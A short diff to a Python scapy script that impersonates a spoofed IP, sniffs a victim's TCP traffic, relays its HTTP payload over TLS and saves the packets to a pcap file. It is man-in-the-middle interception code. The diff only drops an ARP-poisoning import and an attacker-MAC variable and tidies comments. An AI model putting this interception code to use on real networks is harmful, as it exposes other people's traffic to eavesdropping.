@@ -1,6 +1,5 @@
 from scapy.all import *
 from scapy_ssl_tls.ssl_tls import *
-from arppoison import gethostmac
 
 tls_version = TLSVersion.TLS_1_2
 ciphers = [TLSCipherSuite.ECDHE_RSA_WITH_AES_128_GCM_SHA256]
@@ -12,11 +11,10 @@ def forward(p, port, ipLayerC, ifa, socket):
         tcpLayer = TCP(sport = 80, dport = port, seq = p.ack, ack = p.seq + len(p.load), flags = "PA")
         send(ipLayerC / tcpLayer / answer[TLSPlaintext].data, iface = ifa, verbose = False)
         return p.summary() + "\n" + answer.summary()
-    except:
+    except: # The captured packet did not have an HTTP load
         return p.summary()
         
 def startforwarding(ipToSpoof, ifa, timeOut, output):
-    attackerMac = gethostmac(ifa)
     print "Listening as " + ipToSpoof
 
     # SYN from client
@@ -41,6 +39,6 @@ def startforwarding(ipToSpoof, ifa, timeOut, output):
         packets = sniff(filter = "tcp and src host " + ipVictim, iface = ifa, timeout = timeOut,
             prn = lambda(p): forward(p, port, ipLayerC, ifa, socket))
 
-        #save sniffed packetsS
+        # Save sniffed packets
         if output:
             wrpcap(output, packets)
